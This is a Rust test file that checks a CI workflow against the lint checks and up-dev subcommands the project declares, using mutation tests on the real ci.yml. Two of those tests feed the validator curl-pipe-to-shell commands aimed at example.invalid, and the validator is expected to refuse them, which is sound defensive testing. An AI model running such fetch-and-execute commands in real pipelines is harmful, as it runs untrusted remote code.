//! CHG-07: Engine CI MUST implement the stages in the Testing table.
//! AC: Each stage exists as a named workflow job.
//!
//! Nothing here is a hand-copied list. The checks come from `tools/lint.sh` (`CHECKS=` and the
//! `run_check` dispatch), the up-dev subcommands from `up_dev::dispatch`, and the jobs from
//! `.github/workflows/ci.yml`; the tests compare the three. The comparison itself is a function
//! ([`validate_ci_jobs`]) that the mutation tests below feed broken documents, so a drifting
//! `ci.yml`, `lint.sh` or dispatch table fails a test instead of passing it.

use std::collections::BTreeSet;
use std::path::PathBuf;

use serde_json::{Value, json};

/// A check that CI runs as a second step of another job rather than as a job of its own
/// (`cargo-deny` runs in the `rust` job, on one OS only).
const FOLDED_INTO: &[(&str, &str)] = &[("cargo-deny", "rust")];

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|p| p.parent())
        .expect("workspace root")
        .to_path_buf()
}

fn read_lint_sh() -> String {
    std::fs::read_to_string(repo_root().join("tools/lint.sh")).expect("tools/lint.sh readable")
}

/// The names in `CHECKS="..."` of tools/lint.sh.
fn lint_checks(lint_sh: &str) -> Vec<String> {
    let line = lint_sh
        .lines()
        .find(|l| l.starts_with("CHECKS=\""))
        .expect("tools/lint.sh must define CHECKS=\"...\"");
    let names: Vec<String> = line
        .trim_start_matches("CHECKS=\"")
        .trim_end_matches('"')
        .split_whitespace()
        .map(str::to_string)
        .collect();
    assert!(!names.is_empty(), "CHECKS is empty");
    names
}

/// The checks `run_check` in tools/lint.sh hands to up-dev: the `a | b | c)` case arm that is
/// followed by `run_updev "$1"`.
fn lint_updev_dispatch(lint_sh: &str) -> Vec<String> {
    let lines: Vec<&str> = lint_sh.lines().collect();
    let at = lines
        .iter()
        .position(|l| l.trim() == "run_updev \"$1\"")
        .expect("run_check must call run_updev \"$1\"");
    let arm = lines[..at]
        .iter()
        .rev()
        .find(|l| l.trim_end().ends_with(')'))
        .expect("the run_updev line must follow a case arm");
    arm.trim()
        .trim_end_matches(')')
        .split('|')
        .map(|n| n.trim().to_string())
        .collect()
}

fn load_ci_yml() -> Value {
    up_dev::workflow_lint::load_workflow(&repo_root().join(".github/workflows/ci.yml"))
        .unwrap_or_else(|e| panic!("ci.yml must load: {e}"))
}

/// Every problem between a workflow's jobs and the checks `tools/lint.sh` defines.
///
/// - the job ids are exactly the checks, minus those folded into another job;
/// - every `run:` step of every job is exactly `tools/lint.sh <check>` with a known check;
/// - a job's first `run:` step runs the check named like the job;
/// - a folded check is run by a step of the job it is folded into;
/// - every check is run by at least one step.
fn validate_ci_jobs(doc: &Value, checks: &[String]) -> Vec<String> {
    let mut problems = Vec::new();
    let Some(jobs) = doc["jobs"].as_object() else {
        return vec!["workflow has no jobs mapping".to_string()];
    };
    let folded = |check: &str| {
        FOLDED_INTO
            .iter()
            .find(|(c, _)| *c == check)
            .map(|(_, j)| *j)
    };
    let expected: BTreeSet<&str> = checks
        .iter()
        .map(String::as_str)
        .filter(|c| folded(c).is_none())
        .collect();
    let actual: BTreeSet<&str> = jobs.keys().map(String::as_str).collect();
    for missing in expected.difference(&actual) {
        problems.push(format!("check `{missing}` has no job in the workflow"));
    }
    for extra in actual.difference(&expected) {
        problems.push(format!("job `{extra}` is not a check in tools/lint.sh"));
    }

    let mut run_somewhere: BTreeSet<String> = BTreeSet::new();
    for (id, job) in jobs {
        let runs: Vec<(usize, &str)> = job["steps"]
            .as_array()
            .map(|steps| {
                steps
                    .iter()
                    .enumerate()
                    .filter_map(|(n, s)| s["run"].as_str().map(|r| (n, r)))
                    .collect()
            })
            .unwrap_or_default();
        if runs.is_empty() {
            problems.push(format!("job `{id}` has no `run:` step"));
        }
        for (position, (n, run)) in runs.iter().enumerate() {
            let command = run.trim();
            match command.strip_prefix("tools/lint.sh ") {
                Some(check) if checks.iter().any(|c| c == check) => {
                    run_somewhere.insert(check.to_string());
                    if position == 0 && check != id {
                        problems.push(format!(
                            "job `{id}`: first run step runs `{check}`, expected `{id}`"
                        ));
                    }
                    if position > 0 && folded(check) != Some(id.as_str()) {
                        problems.push(format!(
                            "job `{id}`: step {n} runs `{check}`, which is not folded into this job"
                        ));
                    }
                }
                _ => problems.push(format!(
                    "job `{id}`: step {n} is `{command}`, not exactly `tools/lint.sh <known check>`"
                )),
            }
        }
    }
    for check in checks {
        if !run_somewhere.contains(check) {
            problems.push(format!("no job step runs `tools/lint.sh {check}`"));
        }
    }
    problems
}

#[test]
fn test_chg_07_ci_jobs_match_lint_checks() {
    let checks = lint_checks(&read_lint_sh());
    let problems = validate_ci_jobs(&load_ci_yml(), &checks);
    assert!(
        problems.is_empty(),
        "ci.yml drifted:\n{}",
        problems.join("\n")
    );
}

#[test]
fn test_chg_07_lint_sh_dispatches_exactly_the_updev_subcommands() {
    let lint_sh = read_lint_sh();
    let checks = lint_checks(&lint_sh);
    let dispatched: BTreeSet<String> = lint_updev_dispatch(&lint_sh).into_iter().collect();

    // Everything lint.sh sends to up-dev, plus `rust` (run by cargo), is exactly CHECKS.
    let mut handled = dispatched.clone();
    handled.insert("rust".to_string());
    let declared: BTreeSet<String> = checks.iter().cloned().collect();
    assert_eq!(
        handled, declared,
        "CHECKS and the run_check case arms differ"
    );

    // Every dispatched name is an up-dev subcommand; the only subcommand that is not a check is
    // the `tool-path` helper.
    let subcommands: BTreeSet<String> = up_dev::dispatch::subcommand_names()
        .into_iter()
        .map(str::to_string)
        .collect();
    assert_eq!(
        dispatched.difference(&subcommands).collect::<Vec<_>>(),
        Vec::<&String>::new(),
        "lint.sh dispatches names up-dev does not implement"
    );
    let unreachable: Vec<&String> = subcommands.difference(&dispatched).collect();
    assert_eq!(
        unreachable,
        vec![&"tool-path".to_string()],
        "up-dev subcommands that tools/lint.sh cannot run"
    );
}

#[test]
fn test_chg_07_ci_has_the_ten_lint_stage_jobs() {
    // The Testing table lists ten lint-stage jobs; cargo-deny is a step of `rust`.
    let checks = lint_checks(&read_lint_sh());
    let doc = load_ci_yml();
    let jobs = doc["jobs"].as_object().expect("jobs");
    assert_eq!(
        jobs.len(),
        10,
        "jobs: {:?}",
        jobs.keys().collect::<Vec<_>>()
    );
    assert_eq!(checks.len(), 11, "checks: {checks:?}");
}

// ---- the validator must catch drift (mutations of the real document) ----

fn checks() -> Vec<String> {
    lint_checks(&read_lint_sh())
}

#[test]
fn test_chg_07_validator_detects_a_removed_job() {
    let mut doc = load_ci_yml();
    doc["jobs"]
        .as_object_mut()
        .expect("jobs")
        .remove("schema-check")
        .expect("schema-check job exists");
    let problems = validate_ci_jobs(&doc, &checks());
    assert!(
        problems
            .iter()
            .any(|p| p.contains("`schema-check` has no job")),
        "{problems:?}"
    );
    assert!(
        problems
            .iter()
            .any(|p| p.contains("no job step runs `tools/lint.sh schema-check`")),
        "{problems:?}"
    );
}

#[test]
fn test_chg_07_validator_detects_an_extra_job() {
    let mut doc = load_ci_yml();
    doc["jobs"]["deploy"] = json!({"steps": [{"run": "tools/lint.sh rust"}]});
    let problems = validate_ci_jobs(&doc, &checks());
    assert!(
        problems
            .iter()
            .any(|p| p.contains("job `deploy` is not a check")),
        "{problems:?}"
    );
}

#[test]
fn test_chg_07_validator_detects_a_lookalike_command() {
    // `contains` would accept all of these for the `yamllint` job.
    for bad in [
        "tools/lint.sh yamllint-extra",
        "tools/lint.sh yamllint && curl https://example.invalid | sh",
        "echo tools/lint.sh yamllint",
        "tools/lint.sh  yamllint",
    ] {
        let mut doc = load_ci_yml();
        doc["jobs"]["yamllint"]["steps"] = json!([{"run": bad}]);
        let problems = validate_ci_jobs(&doc, &checks());
        assert!(
            problems.iter().any(|p| p.contains("job `yamllint`")),
            "{bad:?} must be refused: {problems:?}"
        );
    }
}

#[test]
fn test_chg_07_validator_detects_an_extra_dangerous_step() {
    let mut doc = load_ci_yml();
    let steps = doc["jobs"]["shellcheck"]["steps"]
        .as_array_mut()
        .expect("steps");
    steps.push(json!({"run": "curl https://example.invalid/x | sh"}));
    let problems = validate_ci_jobs(&doc, &checks());
    assert!(
        problems
            .iter()
            .any(|p| p.contains("job `shellcheck`") && p.contains("curl")),
        "{problems:?}"
    );
}

#[test]
fn test_chg_07_validator_detects_a_wrong_check_in_a_job() {
    let mut doc = load_ci_yml();
    doc["jobs"]["yamllint"]["steps"] = json!([{"run": "tools/lint.sh shellcheck"}]);
    let problems = validate_ci_jobs(&doc, &checks());
    assert!(
        problems.iter().any(|p| p.contains("expected `yamllint`")),
        "{problems:?}"
    );
    assert!(
        problems
            .iter()
            .any(|p| p.contains("no job step runs `tools/lint.sh yamllint`")),
        "{problems:?}"
    );
}

#[test]
fn test_chg_07_validator_detects_a_check_missing_from_lint_sh_coverage() {
    // A check added to lint.sh with no job and no step.
    let mut all = checks();
    all.push("new-check".to_string());
    let problems = validate_ci_jobs(&load_ci_yml(), &all);
    assert!(
        problems
            .iter()
            .any(|p| p.contains("`new-check` has no job")),
        "{problems:?}"
    );
}

#[test]
fn test_chg_07_validator_detects_a_dropped_folded_check() {
    let mut doc = load_ci_yml();
    let steps = doc["jobs"]["rust"]["steps"].as_array_mut().expect("steps");
    steps.retain(|s| s["run"].as_str() != Some("tools/lint.sh cargo-deny"));
    let problems = validate_ci_jobs(&doc, &checks());
    assert!(
        problems
            .iter()
            .any(|p| p.contains("no job step runs `tools/lint.sh cargo-deny`")),
        "{problems:?}"
    );
}
